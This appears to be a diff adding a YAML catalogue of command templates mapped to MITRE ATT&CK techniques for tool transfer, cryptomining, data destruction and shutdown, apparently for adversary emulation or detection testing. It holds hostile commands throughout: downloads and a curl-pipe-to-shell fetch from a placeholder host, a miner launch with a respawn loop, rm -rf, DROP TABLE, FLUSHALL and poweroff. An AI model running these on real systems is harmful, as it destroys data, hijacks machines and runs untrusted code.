@@ -1,0 +1,124 @@
+# Tool transfer and impact: hijacking and destruction: written for the Phase 2 catalogue (spec 2.1).
+attack_version: "20.1"
+procedures:
+  - id: fetch-wget-url
+    technique: T1105
+    tactic: TA0011
+    source: own
+    protocol: ssh
+    template: wget http://{{host}}/{{file}} -O /tmp/{{file}}
+  - id: fetch-tftp-get
+    technique: T1105
+    tactic: TA0011
+    source: own
+    protocol: ssh
+    template: tftp {{host}} -c get {{file}}
+  - id: fetch-curl-pipe
+    technique: T1105
+    tactic: TA0011
+    source: corpus
+    protocol: ssh
+    template: curl -o http://{{host}}/{{file}} -O-|sh
+  - id: fetch-tftp-seed
+    technique: T1105
+    tactic: TA0011
+    source: corpus
+    protocol: ssh
+    template: tftp -r {{file}} -g {{host}}
+  - id: fetch-whois-tunnel
+    technique: T1105
+    tactic: TA0011
+    source: atomic
+    protocol: ssh
+    template: whois -h {{host}} -p {{port}} {{word}} > /tmp/{{file}}
+    ref: ART T1105 test 7 whois file download (c99a829f-0bb8-4187-b2c6-d47d1df74cab)
+  - id: miner-run-pool
+    technique: T1496
+    tactic: TA0040
+    source: own
+    protocol: ssh
+    template: /tmp/{{file}} -o stratum+tcp://{{host}}:{{port}} -u {{word}}.{{word2}} -p x --background
+  - id: miner-cpu-burn
+    technique: T1496
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: yes > /dev/null
+    ref: ART T1496 test 1 FreeBSD/macOS/Linux - Simulate CPU Load with Yes (904a5a0e-fb02-490d-9f8d-0e256eb37549)
+  - id: miner-watchdog
+    technique: T1496
+    tactic: TA0040
+    source: own
+    protocol: ssh
+    template: while true; do ps aux | grep -v grep | grep -q {{file}} || /tmp/{{file}} & sleep 30; done
+  - id: miner-process-check
+    technique: T1496
+    tactic: TA0040
+    source: corpus
+    protocol: ssh
+    template: ps aux | grep '[Mm]iner'
+  - id: destroy-mysql-drop
+    technique: T1485
+    tactic: TA0040
+    source: own
+    protocol: mysql
+    template: DROP TABLE wordpress.{{word}}
+  - id: destroy-redis-flush
+    technique: T1485
+    tactic: TA0040
+    source: own
+    protocol: redis
+    template: FLUSHALL
+  - id: destroy-rm-tree
+    technique: T1485
+    tactic: TA0040
+    source: own
+    protocol: ssh
+    template: rm -rf {{dir}}/*
+  - id: destroy-dd-zero
+    technique: T1485
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: dd of=/tmp/{{file}} if=/dev/zero count=100
+    ref: ART T1485 test 1 Overwrite file with DD (38deee99-fd65-4031-bec8-bfa4f9f26146)
+  - id: destroy-mysql-delete
+    technique: T1485
+    tactic: TA0040
+    source: own
+    protocol: mysql
+    template: DELETE FROM crm.customers WHERE id > {{num}}
+  - id: destroy-redis-del
+    technique: T1485
+    tactic: TA0040
+    source: own
+    protocol: redis
+    template: DEL {{word}}
+  - id: shutdown-reboot
+    technique: T1529
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: shutdown -r 5
+    ref: ART T1529 test 1 Restart System via shutdown (6326dbc4-444b-4c04-88f4-27e94d0327cb)
+  - id: shutdown-halt
+    technique: T1529
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: shutdown -h 5
+    ref: ART T1529 test 2 Shutdown System via shutdown (4963a81e-a3ad-4f02-adda-812343b351de)
+  - id: reboot-now
+    technique: T1529
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: reboot
+    ref: ART T1529 test 3 Restart System via reboot (47d0b042-a918-40ab-8cf9-150ffe919027)
+  - id: poweroff-now
+    technique: T1529
+    tactic: TA0040
+    source: atomic
+    protocol: ssh
+    template: poweroff
+    ref: ART T1529 test 7 Shutdown System via poweroff (73a90cd2-48a2-4ac5-8594-2af35fa909fa)
